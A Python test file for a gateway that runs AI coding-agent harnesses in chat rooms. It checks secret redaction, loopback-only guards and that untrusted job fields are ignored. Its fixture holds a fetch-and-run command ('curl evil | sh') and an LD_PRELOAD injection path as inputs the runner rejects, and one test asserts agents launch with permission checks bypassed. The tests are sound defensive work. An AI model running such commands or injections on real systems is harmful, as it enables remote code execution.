"""Managed runner/runtime tests with fake hub and harness boundaries."""

from __future__ import annotations

import io
import json
import os
import stat
from dataclasses import dataclass
from pathlib import Path
from types import SimpleNamespace
from typing import Any, Mapping

import httpx
from fastapi.testclient import TestClient

from opengateway.config import GatewayConfig, GatewayMode
from opengateway.harness_adapters import (
    ClaudeCodeAdapter,
    GrokAdapter,
    InvocationContext,
    InvocationResult,
    ProbeResult,
    valid_harness_session_id,
)
from opengateway.runner import (
    ClaimResult,
    ManagedAgentSpec,
    RunnerAPI,
    RunnerConfig,
    RunnerService,
    connect_runner,
    decode_claim_response,
    decode_job_payload,
    disconnect_runner,
    embedded_runner_allowed,
    host_runner_allowed,
    schedule_local_runner_service,
    ensure_local_runner,
    load_runner_config,
    runner_config_path,
    runner_status,
    _prefer_reachable_hub_url,
)
from opengateway.server import create_app
from opengateway.seat_registry import (
    SeatRecord,
    credential_store_path,
    get_managed_seat,
    load_agent_credential,
    lock_path,
    save_agent_credential,
    try_acquire_seat_lock,
    upsert_seat,
)
from opengateway.seat_runtime import save_cursor
from opengateway.store import Store


def _private_mode(path: Path) -> int:
    return stat.S_IMODE(path.stat().st_mode)


class FakeResponse:
    def __init__(self, data: Mapping[str, Any], status_code: int = 200) -> None:
        self._data = dict(data)
        self.status_code = status_code

    def json(self) -> dict[str, Any]:
        return dict(self._data)

    def raise_for_status(self) -> None:
        if self.status_code >= 400:
            raise AssertionError(f"unexpected HTTP {self.status_code}")


class RedeemClient:
    def __init__(self, token: str) -> None:
        self.token = token
        self.posts: list[tuple[str, dict[str, Any]]] = []

    def post(self, path: str, *, json: dict[str, Any]) -> FakeResponse:
        self.posts.append((path, json))
        return FakeResponse(
            {
                "data": {
                    "runner": {"id": "runner-1", "name": "Mac runner"},
                    "authToken": self.token,
                    "hubUrl": "https://hub.example",
                }
            }
        )

    def request(self, method: str, path: str, **kwargs: Any) -> FakeResponse:
        self.posts.append((path, kwargs.get("json") or {}))
        if str(path).endswith("/heartbeat"):
            return FakeResponse(
                {"runner": {"id": "runner-1", "status": "online"}}
            )
        return FakeResponse({})


class FakeAdapter:
    harness = "claude-code"

    def __init__(self, output: str = "Managed harness reply") -> None:
        self.invocations: list[Any] = []
        self.output = output

    def probe(self) -> ProbeResult:
        return ProbeResult(
            harness=self.harness,
            status="ready",
            available=True,
            authenticated=True,
            detail="ready",
            setup_instructions="",
            executable="claude",
        )

    def invoke(self, context, *, cancel_event=None, emit_log=None) -> InvocationResult:
        self.invocations.append(context)
        if emit_log:
            emit_log("fixed adapter output")
        return InvocationResult(
            harness=self.harness,
            returncode=0,
            duration_seconds=0.01,
            output=self.output,
        )


class FakeRuntimeManager:
    def __init__(self) -> None:
        self.starts: list[dict[str, Any]] = []
        self.stops: list[dict[str, str]] = []

    def start(self, **kwargs) -> dict[str, Any]:
        self.starts.append(kwargs)
        return {
            "ok": True,
            "radio": "on",
            "note": "seat_started",
            "participant_id": kwargs["participant_id"],
        }

    def stop(self, room_id: str = "", participant_id: str = "") -> dict[str, Any]:
        self.stops.append(
            {"room_id": room_id, "participant_id": participant_id}
        )
        return {
            "ok": True,
            "stopped": [f"{room_id}:{participant_id}"]
            if room_id and participant_id
            else [],
        }


class FakeRunnerApi:
    def __init__(self, claims: list[ClaimResult]) -> None:
        self.claims = list(claims)
        self.claimed: list[str] = []
        self.completed: list[dict[str, Any]] = []
        self.logs: list[dict[str, str]] = []
        self.heartbeats: list[Mapping[str, Any]] = []

    def heartbeat(self, payload: Mapping[str, Any]) -> Mapping[str, Any]:
        self.heartbeats.append(payload)
        return {"ok": True}

    def wait_for_job(self, timeout: float = 30.0):
        return None

    def claim_job(self, job_id: str) -> ClaimResult:
        self.claimed.append(job_id)
        return self.claims.pop(0) if self.claims else ClaimResult()

    def complete_job(
        self,
        job_id: str,
        *,
        success: bool,
        result: Mapping[str, Any],
        error: str = "",
    ) -> Mapping[str, Any]:
        self.completed.append(
            {
                "job_id": job_id,
                "success": success,
                "result": dict(result),
                "error": error,
            }
        )
        return {"ok": True}

    def post_log(self, managed_agent_id: str, level: str, message: str) -> None:
        self.logs.append(
            {
                "managed_agent_id": managed_agent_id,
                "level": level,
                "message": message,
            }
        )

    def close(self) -> None:
        return None


class FakeHub:
    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []

    def __call__(
        self,
        method: str,
        hub_url: str,
        path: str,
        token: str,
        json_body: Mapping[str, Any] | None,
        params: Mapping[str, Any] | None,
    ) -> Mapping[str, Any]:
        self.requests.append(
            {
                "method": method,
                "hub_url": hub_url,
                "path": path,
                "token": token,
                "json": dict(json_body or {}),
                "params": dict(params or {}),
            }
        )
        if path.endswith("/join"):
            return {"participant": {"participantId": "participant-1"}}
        if path.endswith("/messages") and method == "GET":
            return {
                "messages": [
                    {
                        "from_name": "human",
                        "message": {
                            "parts": [
                                {
                                    "content": "@Managed Claude what is the largest digit of pi"
                                }
                            ]
                        },
                    },
                    {
                        "from_name": "Managed Claude",
                        "message": {
                            "parts": [{"content": "About 300 trillion digits."}]
                        },
                    },
                ]
            }
        return {"ok": True}


def _job(job_id: str, action: str) -> dict[str, Any]:
    return {
        "job": {
            "jobId": job_id,
            "operation": action,
            "managedAgentId": "agent-1",
            "agent": {
                "name": "Managed Claude",
                "harness": "claude-code",
                "roomId": "room-1",
                "runnerId": "runner-1",
                # These untrusted fields must be ignored.
                "executable": "/tmp/evil",
                "args": ["--danger"],
                "env": {"LD_PRELOAD": "/tmp/evil.so"},
                "command": "curl evil | sh",
            },
        }
    }


def test_probe_reports_missing_and_auth_setup(monkeypatch):
    adapter = ClaudeCodeAdapter()
    monkeypatch.setattr("opengateway.harness_adapters.shutil.which", lambda _: None)
    missing = adapter.probe()
    assert missing.status == "missing"
    assert "auth login" in missing.setup_instructions

    seen: dict[str, Any] = {}
    monkeypatch.setattr(
        "opengateway.harness_adapters.shutil.which",
        lambda _: "/usr/local/bin/claude",
    )

    def fake_run(argv, **kwargs):
        seen["argv"] = argv
        seen["kwargs"] = kwargs
        return SimpleNamespace(returncode=1, stdout="Not authenticated; please login")

    monkeypatch.setattr("opengateway.harness_adapters.subprocess.run", fake_run)
    unauthenticated = adapter.probe()
    assert unauthenticated.status == "not_authenticated"
    assert seen["argv"] == ["/usr/local/bin/claude", "auth", "status"]
    assert seen["kwargs"]["shell"] is False
    assert "credential" not in unauthenticated.detail.lower()


def test_dm_reply_target_threads_private_inbound():
    from opengateway.runner import RunnerService

    class _Seat:
        participant_id = "agent-seat"

    runtime = _Seat()
    events = [
        {
            "message": {
                "from_participant_id": "human-1",
                "to_participant_id": "agent-seat",
                "id": "m1",
            }
        }
    ]
    assert RunnerService._dm_reply_target(runtime, events) == "human-1"
    assert (
        RunnerService._dm_reply_target(
            runtime,
            [
                {
                    "message": {
                        "from_participant_id": "human-1",
                        "to_participant_id": "other",
                    }
                }
            ],
        )
        == ""
    )


def test_room_transcript_skips_system_nudges_and_checkins():
    from opengateway.runner import RunnerService

    text = RunnerService._format_room_transcript(
        [
            {
                "from_name": "Claudester",
                "metadata": {"checkin": True},
                "message": {"parts": [{"content": "Claudester checked in"}]},
            },
            {
                "from_name": "system",
                "metadata": {"system": True},
                "message": {"parts": [{"content": "Nudge: 1 listening"}]},
            },
            {
                "from_name": "human",
                "message": {"parts": [{"content": "@Claudester you check it"}]},
            },
        ]
    )
    assert "checked in" not in text
    assert "Nudge" not in text
    assert "you check it" in text


def test_sanitize_harness_output_drops_session_hook_noise():
    from opengateway.harness_adapters import sanitize_harness_output

    raw = (
        "Yo! Claudester here. What do you need?\n"
        "SessionEnd hook [command -v node >/dev/null 2>&1 || exit 0; "
        'CLAUDE_PLUGIN_OPTION_AUDIT_KEY="${user_config.audit_key}" '
        "node audit.mjs seal] failed: Hook from plugin exchekskills@local-desktop-app-uploads "
        "references ${user_config.*} in a shell-form command."
    )
    assert sanitize_harness_output(raw) == "Yo! Claudester here. What do you need?"
    assert sanitize_harness_output("SessionEnd hook failed") == ""


def test_claude_and_grok_resume_existing_session(monkeypatch):
    monkeypatch.setattr(
        "opengateway.harness_adapters.shutil.which",
        lambda name: f"/fixed/bin/{name}",
    )
    session_id = "11111111-1111-1111-1111-111111111111"
    seen: list[list[str]] = []

    class FakeProcess:
        pid = 12345
        stdout = io.StringIO("ok")

        def poll(self):
            return 0

        def wait(self, timeout=None):
            return 0

    def fake_popen(**kwargs):
        seen.append(list(kwargs["args"]))
        return FakeProcess()

    monkeypatch.setattr(
        "opengateway.harness_adapters.subprocess.Popen",
        fake_popen,
    )
    context = InvocationContext(
        harness="claude-code",
        agent_name="Managed Claude",
        room_id="room-1",
        participant_id="participant-1",
        hub_url="https://hub.example",
        prompt="follow up",
        session_id=session_id,
        resume_session=True,
    )
    assert ClaudeCodeAdapter().invoke(context).ok
    assert seen[0][-2:] == ["--resume", session_id]
    grok_ctx = InvocationContext(
        harness="grok",
        agent_name="Managed Grok",
        room_id="room-1",
        participant_id="participant-1",
        hub_url="https://hub.example",
        prompt="follow up",
        session_id=session_id,
        resume_session=False,
    )
    assert GrokAdapter().invoke(grok_ctx).ok
    assert seen[1][-2:] == ["--session-id", session_id]


def test_adapter_invocation_uses_fixed_argv_and_sanitized_environment(monkeypatch):
    adapter = ClaudeCodeAdapter()
    monkeypatch.setenv("OPENGATEWAY_AUTH_TOKEN", "master-do-not-leak")
    monkeypatch.setenv("OPENGATEWAY_TOKEN", "other-master-do-not-leak")
    monkeypatch.setattr(
        "opengateway.harness_adapters.shutil.which",
        lambda _: "/fixed/bin/claude",
    )
    seen: dict[str, Any] = {}

    class FakeProcess:
        pid = 12345
        stdout = io.StringIO("")

        def poll(self):
            return 0

        def wait(self, timeout=None):
            return 0

    def fake_popen(**kwargs):
        seen.update(kwargs)
        return FakeProcess()

    monkeypatch.setattr(
        "opengateway.harness_adapters.subprocess.Popen",
        fake_popen,
    )
    result = adapter.invoke(
        InvocationContext(
            harness="claude-code",
            agent_name="Managed Claude",
            room_id="room-1",
            participant_id="participant-1",
            hub_url="https://hub.example",
            prompt="Respond to the addressed message.",
        )
    )
    assert result.ok
    assert seen["shell"] is False
    assert seen["args"] == [
        "/fixed/bin/claude",
        "-p",
        "Respond to the addressed message.",
        "--permission-mode",
        "bypassPermissions",
    ]
    assert "OPENGATEWAY_AUTH_TOKEN" not in seen["env"]
    assert "OPENGATEWAY_TOKEN" not in seen["env"]
    assert "OPENGATEWAY_RUNNER_TOKEN" not in seen["env"]
    assert seen["env"]["OPENGATEWAY_MANAGED_RUNNER"] == "1"
    assert "agent-only-token" not in repr(seen["env"])
    assert "master-do-not-leak" not in repr(seen["env"])


def test_connect_stores_secrets_separately_and_redacts_repr(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    token = "ogk_runner_super_secret"
    result = connect_runner(
        url="https://hub.example",
        code="ABCD-EFGH-JKLM",
        name="Mac runner",
        client=RedeemClient(token),
    )
    assert result["runner_id"] == "runner-1"
    config = load_runner_config()
    assert config is not None
    assert token not in repr(config)
    assert token not in runner_config_path().read_text(encoding="utf-8")
    assert token in credential_store_path().read_text(encoding="utf-8")
    assert _private_mode(runner_config_path()) == 0o600
    assert _private_mode(credential_store_path()) == 0o600
    assert _private_mode(runner_config_path().parent) == 0o700
    assert token not in json.dumps(runner_status(include_probes=False))


def test_ensure_local_runner_rejects_public_hub():
    try:
        ensure_local_runner(
            url="https://hub.example",
            auth_token="master-token",
        )
    except Exception as exc:
        assert "loopback" in str(exc).lower()
    else:
        raise AssertionError("expected loopback guard")


def test_ensure_local_runner_reuses_running_service(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))

    class LocalRedeemClient(RedeemClient):
        def post(self, path: str, *, json: dict[str, Any]) -> FakeResponse:
            return FakeResponse(
                {
                    "data": {
                        "runner": {"id": "runner-1", "name": "Local Runner"},
                        "authToken": self.token,
                        "hubUrl": "http://127.0.0.1:8765",
                    }
                }
            )

    connect_runner(
        url="http://127.0.0.1:8765",
        code="ABCD-EFGH-JKLM",
        name="Local Runner",
        client=LocalRedeemClient("ogk_runner_super_secret"),
    )
    monkeypatch.setattr(
        "opengateway.runner_service.runner_service_status",
        lambda platform_name="": {"running": True, "installed": True},
    )
    paired = ensure_local_runner(
        url="http://localhost:8765",
        auth_token="master-token",
    )
    assert paired["status"] == "already_running"


def test_ensure_local_runner_pairs_and_installs(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    installs: list[str] = []

    class PairHttp:
        def __init__(self, *args: Any, **kwargs: Any) -> None:
            pass

        def __enter__(self) -> PairHttp:
            return self

        def __exit__(self, *args: Any) -> None:
            return None

        def post(self, path: str, *, json: dict[str, Any]) -> FakeResponse:
            assert path == "/v1/runners/pair"
            return FakeResponse({"code": "ABCD-EFGH-JKLM"})

    monkeypatch.setattr("opengateway.runner.httpx.Client", PairHttp)
    monkeypatch.setattr(
        "opengateway.runner_service.install_runner_service",
        lambda platform_name="": installs.append("yes") or {"logs": "/tmp"},
    )
    class LocalRedeemClient(RedeemClient):
        def post(self, path: str, *, json: dict[str, Any]) -> FakeResponse:
            return FakeResponse(
                {
                    "data": {
                        "runner": {"id": "runner-1", "name": "Local Runner"},
                        "authToken": self.token,
                        "hubUrl": "http://127.0.0.1:8765",
                    }
                }
            )

    result = ensure_local_runner(
        url="http://127.0.0.1:8765",
        auth_token="master-token",
        client=LocalRedeemClient("ogk_runner_super_secret"),
    )
    assert result["status"] == "paired"
    assert installs == ["yes"]
    assert load_runner_config() is not None


def test_prefer_operator_url_when_hub_advertises_loopback():
    assert (
        _prefer_reachable_hub_url(
            "http://192.168.1.50:8765",
            "http://127.0.0.1:8765",
        )
        == "http://192.168.1.50:8765"
    )
    assert (
        _prefer_reachable_hub_url(
            "https://hub.example",
            "https://hub.example",
        )
        == "https://hub.example"
    )


def test_disconnect_revokes_remote_identity_before_clearing_local(
    tmp_path,
    monkeypatch,
):
    monkeypatch.setenv("HOME", str(tmp_path))
    connect_runner(
        url="https://hub.example",
        code="ABCD-EFGH-JKLM",
        name="Mac runner",
        client=RedeemClient("ogk_runner_super_secret"),
    )
    save_agent_credential("managed:remote-agent", "remote-agent-token")
    save_agent_credential("managed:embedded-agent", "embedded-agent-token")
    upsert_seat(
        SeatRecord(
            room_id="remote-room",
            managed_agent_id="remote-agent",
            runner_id="runner-1",
        )
    )
    upsert_seat(
        SeatRecord(
            room_id="embedded-room",
            managed_agent_id="embedded-agent",
            runner_id="embedded-runner",
        )
    )
    calls: list[str] = []

    def fake_disconnect(api):
        assert load_runner_config() is not None
        calls.append(api.config.runner_id)
        return {"status": "revoked"}

    monkeypatch.setattr(RunnerAPI, "disconnect", fake_disconnect)
    disconnected = disconnect_runner()
    assert calls == ["runner-1"]
    assert disconnected["connected"] is False
    assert load_runner_config() is None
    assert get_managed_seat("remote-agent") is None
    assert get_managed_seat("embedded-agent") is not None
    assert load_agent_credential("managed:remote-agent") == ""
    assert (
        load_agent_credential("managed:embedded-agent")
        == "embedded-agent-token"
    )


def test_runner_exits_cleanly_when_hub_revokes_its_identity(
    tmp_path,
    monkeypatch,
):
    monkeypatch.setenv("HOME", str(tmp_path))

    class RevokedApi(FakeRunnerApi):
        def wait_for_job(self, timeout: float = 30.0):
            request = httpx.Request(
                "GET",
                "https://hub.example/v1/runners/runner-1/jobs/wait",
            )
            response = httpx.Response(401, request=request)
            raise httpx.HTTPStatusError(
                "runner revoked",
                request=request,
                response=response,
            )

    service = RunnerService(
        RunnerConfig(
            runner_id="runner-1",
            hub_url="https://hub.example",
            name="runner",
        ),
        "ogk_runner_secret",
        api=RevokedApi([]),
        heartbeat_interval=60,
    )
    assert service.run() == 0
    status = json.loads(
        (runner_config_path().parent / "status.json").read_text(
            encoding="utf-8"
        )
    )
    assert status["state"] == "revoked"


def test_job_lifecycle_duplicate_and_delete(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    agent_token = "ogk_agent_super_secret"
    api = FakeRunnerApi(
        [
            ClaimResult(agent_token=agent_token, hub_url="https://hub.example"),
            ClaimResult(agent_token="unused_duplicate_token"),
            ClaimResult(),
            ClaimResult(),
        ]
    )
    hub = FakeHub()
    runtime = FakeRuntimeManager()
    adapter = FakeAdapter()
    service = RunnerService(
        RunnerConfig(
            runner_id="runner-1",
            hub_url="https://hub.example",
            name="runner",
        ),
        "ogk_runner_secret",
        api=api,
        adapter_factory=lambda _: adapter,
        hub_request=hub,
        runtime_manager=runtime,  # type: ignore[arg-type]
    )

    started = service.process_job(_job("job-start", "start"))
    assert started["runtime_status"] == "running"
    assert len(runtime.starts) == 1
    assert runtime.starts[0]["on_wake"] is not None
    join = next(req for req in hub.requests if req["path"].endswith("/join"))
    assert set(join["json"]) == {
        "name",
        "harness",
        "role",
        "capabilities",
        "metadata",
    }
    assert "command" not in json.dumps(join["json"])
    posts = [
        req
        for req in hub.requests
        if req["path"].endswith("/messages") and req["method"] == "POST"
    ]
    assert len(posts) == 1
    assert posts[0]["json"].get("metadata", {}).get("checkin") is True
    wake = runtime.starts[0]["on_wake"]
    wake(
        [
            {
                "delivery_id": "delivery-1",
                "message": {
                    "id": "message-1",
                    "from_name": "human",
                    "message": {
                        "parts": [{"content": "@Managed Claude please reply"}]
                    },
                    "metadata": {
                        "delivery_id": "delivery-1",
                        "chain_id": "chain-1",
                        "agent_hop": 0,
                    },
                },
            }
        ]
    )
    history_get = next(
        req
        for req in hub.requests
        if req["path"].endswith("/messages") and req["method"] == "GET"
    )
    assert history_get["params"]["limit"] == 24
    prompt = adapter.invocations[0].prompt
    assert "300 trillion" in prompt
    assert "largest digit of pi" in prompt
    posted = [
        req
        for req in hub.requests
        if req["path"].endswith("/messages") and req["method"] == "POST"
    ][-1]
    assert posted["json"]["content"] == "Managed harness reply"
    assert posted["json"]["from_participant_id"] == "participant-1"
    assert posted["json"]["metadata"] == {
        "managed_agent_id": "agent-1",
        "in_reply_to_delivery": "delivery-1",
        "chain_id": "chain-1",
        "agent_hop": 1,
    }
    assert posted["token"] == agent_token
    assert valid_harness_session_id(adapter.invocations[0].session_id)
    assert adapter.invocations[0].resume_session is False
    wake(
        [
            {
                "delivery_id": "delivery-2",
                "message": {
                    "id": "message-2",
                    "from_name": "human",
                    "message": {
                        "parts": [{"content": "@Managed Claude you check it"}]
                    },
                    "metadata": {
                        "delivery_id": "delivery-2",
                        "chain_id": "chain-1",
                        "agent_hop": 0,
                    },
                },
            }
        ]
    )
    assert adapter.invocations[1].session_id == adapter.invocations[0].session_id
    assert adapter.invocations[1].resume_session is True
    assert "harness session continues" in adapter.invocations[1].prompt
    assert "Recent conversation" in adapter.invocations[1].prompt

    duplicate = service.process_job(_job("job-duplicate", "start"))
    assert duplicate["idempotent"] is True
    assert duplicate["note"] == "already_running"
    assert len(runtime.starts) == 1

    metadata_text = (
        Path(tmp_path) / ".opengateway" / "seats.json"
    ).read_text(encoding="utf-8")
    credential_text = credential_store_path().read_text(encoding="utf-8")
    assert agent_token not in metadata_text
    assert agent_token in credential_text
    assert agent_token not in repr(service)
    assert all(agent_token not in row["message"] for row in api.logs)
    for index in range(260):
        service._log("agent-1", "info", f"line {index}: token={agent_token}")
    assert len(service._logs["agent-1"]) == 200
    service._flush_logs("agent-1")
    assert all(agent_token not in row["message"] for row in api.logs)

    stopped = service.process_job(_job("job-stop", "stop"))
    assert stopped["runtime_status"] == "stopped"
    assert runtime.stops[-1]["participant_id"] == "participant-1"
    assert any(req["path"].endswith("/leave") for req in hub.requests)
    assert load_agent_credential("managed:agent-1") == agent_token

    save_cursor("room-1", "participant-1", "message-1")
    assert try_acquire_seat_lock(
        "room-1",
        "participant-1",
        owner="runner:runner-1:agent-1",
    )
    deleted = service.process_job(_job("job-delete", "delete"))
    assert deleted["runtime_status"] == "deleted"
    assert get_managed_seat("agent-1") is None
    assert load_agent_credential("managed:agent-1") == ""
    assert not (
        Path(tmp_path)
        / ".opengateway"
        / "cursors"
        / "room-1_participant-1.json"
    ).exists()
    assert not lock_path("room-1", "participant-1").exists()
    assert api.completed[-1]["success"] is True


def test_empty_harness_output_posts_nothing_and_keeps_agent_running(
    tmp_path,
    monkeypatch,
):
    monkeypatch.setenv("HOME", str(tmp_path))
    api = FakeRunnerApi(
        [ClaimResult(agent_token="agent-token", hub_url="https://hub.example")]
    )
    hub = FakeHub()
    runtime = FakeRuntimeManager()
    service = RunnerService(
        RunnerConfig(
            runner_id="runner-1",
            hub_url="https://hub.example",
            name="runner",
        ),
        "runner-token",
        api=api,
        adapter_factory=lambda _: FakeAdapter(output=" \n"),
        hub_request=hub,
        runtime_manager=runtime,  # type: ignore[arg-type]
    )
    service.process_job(_job("job-start", "start"))
    runtime.starts[0]["on_wake"](
        [
            {
                "delivery_id": "delivery-empty",
                "message": {
                    "id": "message-empty",
                    "from_name": "human",
                    "message": {
                        "parts": [{"content": "@Managed Claude ack"}]
                    },
                },
            }
        ]
    )
    posted = [
        req
        for req in hub.requests
        if req["path"].endswith("/messages")
        and req["method"] == "POST"
        and not (req.get("json") or {}).get("metadata", {}).get("checkin")
    ]
    assert len(posted) == 0
    record = get_managed_seat("agent-1")
    assert record is not None
    assert record.runtime_status == "running"


def test_restore_configured_agent_after_restart(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    save_agent_credential("managed:agent-restore", "ogk_restore_secret")
    upsert_seat(
        SeatRecord(
            room_id="room-restore",
            participant_id="participant-old",
            name="Restored Hermes",
            harness="hermes",
            base_url="https://hub.example",
            managed_agent_id="agent-restore",
            runner_id="runner-1",
            desired_state="running",
            runtime_status="stopped",
        )
    )
    runtime = FakeRuntimeManager()
    hub = FakeHub()
    service = RunnerService(
        RunnerConfig(
            runner_id="runner-1",
            hub_url="https://hub.example",
            name="runner",
        ),
        "ogk_runner_secret",
        api=FakeRunnerApi([]),
        adapter_factory=lambda _: FakeAdapter(),
        hub_request=hub,
        runtime_manager=runtime,  # type: ignore[arg-type]
    )
    restored = service.restore_agents()
    assert restored[0]["runtime_status"] == "running"
    assert len(runtime.starts) == 1
    join = next(req for req in hub.requests if req["path"].endswith("/join"))
    # The hub reattaches by managed token/name. Sending an old participant id
    # would fail after a restart rotates the managed-agent key.
    assert "participant_id" not in join["json"]
    assert join["token"] == "ogk_restore_secret"


def test_decoders_accept_flat_and_nested_backend_fields():
    job = decode_job_payload(
        {
            "id": "job-1",
            "action": "start",
            "managed_agent_id": "agent-1",
            "agent_name": "Grok",
            "harness": "grok",
            "room_id": "room-1",
            "runner_id": "runner-1",
        }
    )
    assert job is not None
    assert job.agent.name == "Grok"
    claim = decode_claim_response(
        {
            "result": {
                "credentials": {"authToken": "secret"},
                "baseUrl": "https://hub.example/",
            }
        }
    )
    assert claim.agent_token == "secret"
    assert claim.hub_url == "https://hub.example"
    assert "secret" not in repr(claim)


@dataclass
class FakeGatewayConfig:
    mode: Any
    host: str
    network: str


def test_embedded_runner_only_allowed_for_internal_loopback():
    internal = FakeGatewayConfig(
        mode=SimpleNamespace(value="internal"),
        host="127.0.0.1",
        network="loopback",
    )
    public = FakeGatewayConfig(
        mode=SimpleNamespace(value="public"),
        host="0.0.0.0",
        network="public",
    )
    assert embedded_runner_allowed(internal, environ={})
    assert not embedded_runner_allowed(public, environ={})
    assert not embedded_runner_allowed(
        SimpleNamespace(
            mode=SimpleNamespace(value="internal"),
            host="127.0.0.1",
            network="loopback",
            base_url="https://public.example",
        ),
        environ={},
    )
    assert not embedded_runner_allowed(
        internal,
        environ={"RAILWAY_PROJECT_ID": "project-1"},
    )


def test_host_runner_starts_for_tailscale_serve_on_localhost():
    serve = SimpleNamespace(
        mode=SimpleNamespace(value="public"),
        host="127.0.0.1",
        network="tailscale",
        base_url="https://box.tailnet.ts.net",
    )
    lan = SimpleNamespace(
        mode=SimpleNamespace(value="public"),
        host="0.0.0.0",
        network="lan",
        base_url="http://192.168.1.20:8765",
    )
    remote = SimpleNamespace(
        mode=SimpleNamespace(value="public"),
        host="0.0.0.0",
        network="public",
        base_url="https://hub.example",
    )
    assert not embedded_runner_allowed(serve, environ={})
    assert host_runner_allowed(serve, environ={})
    assert host_runner_allowed(lan, environ={})
    assert not host_runner_allowed(remote, environ={})
    assert not host_runner_allowed(
        serve, environ={"RAILWAY_SERVICE_ID": "svc"}
    )
    assert not host_runner_allowed(
        serve, environ={"OPENGATEWAY_RUNNER_SERVICE": "1"}
    )
    internal = FakeGatewayConfig(
        mode=SimpleNamespace(value="internal"),
        host="127.0.0.1",
        network="loopback",
    )
    assert embedded_runner_allowed(internal, environ={})
    assert not host_runner_allowed(internal, environ={})


def test_schedule_local_runner_service_pairs_after_ping(monkeypatch):
    calls: list[dict[str, str]] = []
    logs: list[str] = []

    class _Response:
        status_code = 200

    monkeypatch.setattr(
        "opengateway.runner.httpx.get",
        lambda *args, **kwargs: _Response(),
    )
    monkeypatch.setattr(
        "opengateway.runner.ensure_local_runner",
        lambda **kwargs: calls.append(kwargs) or {"status": "paired", "runner_id": "r1"},
    )
    thread = schedule_local_runner_service(
        hub_url="http://127.0.0.1:8765",
        auth_token="secret-token",
        log=logs.append,
        wait_seconds=2,
    )
    thread.join(timeout=3)
    assert calls == [
        {
            "url": "http://127.0.0.1:8765",
            "auth_token": "secret-token",
            "name": "Local Runner",
        }
    ]
    assert any("paired" in line for line in logs)


def test_runner_service_matches_live_rest_contract(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    master = "integration-master-secret"
    store = Store(db_path=None)
    app = create_app(
        store=store,
        config=GatewayConfig(
            mode=GatewayMode.PUBLIC,
            host="127.0.0.1",
            auth_token=master,
            require_auth=True,
            network="lan",
        ),
    )
    admin = {"Authorization": f"Bearer {master}"}
    with TestClient(app) as client:
        room = client.post(
            "/v1/rooms",
            json={"name": "runner-integration"},
            headers=admin,
        ).json()
        pair = client.post(
            "/v1/runners/pair",
            json={"name": "test runner"},
            headers=admin,
        ).json()
        redeemed = client.post(
            "/v1/runners/redeem",
            json={
                "code": pair["code"],
                "name": "test runner",
                "hostname": "pytest",
                "platform": "pytest",
                "version": "test",
                "capabilities": {},
            },
        ).json()
        runner_id = redeemed["runner"]["id"]
        api = RunnerAPI(
            RunnerConfig(
                runner_id=runner_id,
                hub_url="http://testserver",
                name="test runner",
            ),
            redeemed["token"],
            client=client,
        )
        api.heartbeat({})
        created = client.post(
            "/v1/managed-agents",
            json={
                "name": "Live Claude",
                "harness": "claude-code",
                "room_id": room["id"],
                "runner_id": runner_id,
            },
            headers=admin,
        ).json()

        def hub_request(
            method: str,
            hub_url: str,
            path: str,
            token: str,
            json_body: Mapping[str, Any] | None,
            params: Mapping[str, Any] | None,
        ) -> Mapping[str, Any]:
            response = client.request(
                method,
                path,
                headers={"Authorization": f"Bearer {token}"},
                json=dict(json_body) if json_body is not None else None,
                params=dict(params) if params is not None else None,
            )
            response.raise_for_status()
            value = response.json()
            return value if isinstance(value, dict) else {}

        runtime = FakeRuntimeManager()
        service = RunnerService(
            api.config,
            redeemed["token"],
            api=api,
            adapter_factory=lambda _: FakeAdapter(),
            hub_request=hub_request,
            runtime_manager=runtime,  # type: ignore[arg-type]
        )
        start_job = api.wait_for_job(timeout=1)
        assert start_job is not None
        started = service.process_job(start_job)
        participant_id = started["participant_id"]
        assert started["runtime_status"] == "running"
        assert store.runner_jobs[created["job"]["id"]].status.value == "completed"

        restart = client.post(
            f"/v1/managed-agents/{created['agent']['id']}/actions/restart",
            headers=admin,
        ).json()
        restart_job = api.wait_for_job(timeout=1)
        assert restart_job is not None
        restarted = service.process_job(restart_job)
        assert restarted["participant_id"] == participant_id
        assert store.runner_jobs[restart["job"]["id"]].status.value == "completed"

        participants = client.get(
            f"/v1/rooms/{room['id']}/participants",
            headers=admin,
        ).json()["participants"]
        matches = [
            person
            for person in participants
            if person.get("metadata", {}).get("managed_agent_id")
            == created["agent"]["id"]
        ]
        assert len(matches) == 1
        assert matches[0]["id"] == participant_id


def test_start_agent_not_idempotent_when_seat_lock_is_for_other_room(
    tmp_path, monkeypatch
):
    monkeypatch.setenv("HOME", str(tmp_path))
    from opengateway.seat_registry import SeatRecord, upsert_seat

    agent_id = "managed-move-test"
    upsert_seat(
        SeatRecord(
            room_id="room-old",
            participant_id="seat-old",
            name="mover",
            harness="claude-code",
            wake="harness",
            base_url="https://hub.example",
            auth_token="tok",
            managed_agent_id=agent_id,
            runner_id="runner-1",
            desired_state="running",
            runtime_status="running",
        )
    )

    def fake_lock_active(room_id: str, participant_id: str) -> bool:
        return room_id == "room-old" and participant_id == "seat-old"

    monkeypatch.setattr("opengateway.runner.seat_lock_active", fake_lock_active)

    api = FakeRunnerApi(
        [ClaimResult(agent_token="ogk_move_agent", hub_url="https://hub.example")]
    )
    hub = FakeHub()
    runtime = FakeRuntimeManager()
    service = RunnerService(
        RunnerConfig(
            runner_id="runner-1",
            hub_url="https://hub.example",
            name="runner",
        ),
        "ogk_runner",
        api=api,
        adapter_factory=lambda _: FakeAdapter(),
        hub_request=hub,
        runtime_manager=runtime,  # type: ignore[arg-type]
    )

    spec = ManagedAgentSpec(
        managed_agent_id=agent_id,
        name="mover",
        harness="claude-code",
        room_id="room-new",
        runner_id="runner-1",
    )
    result = service._start_agent(spec, api.claim_job("job-move"))
    assert result.get("note") != "already_running_other_process"
    assert len(runtime.starts) == 1
    assert runtime.starts[0]["room_id"] == "room-new"
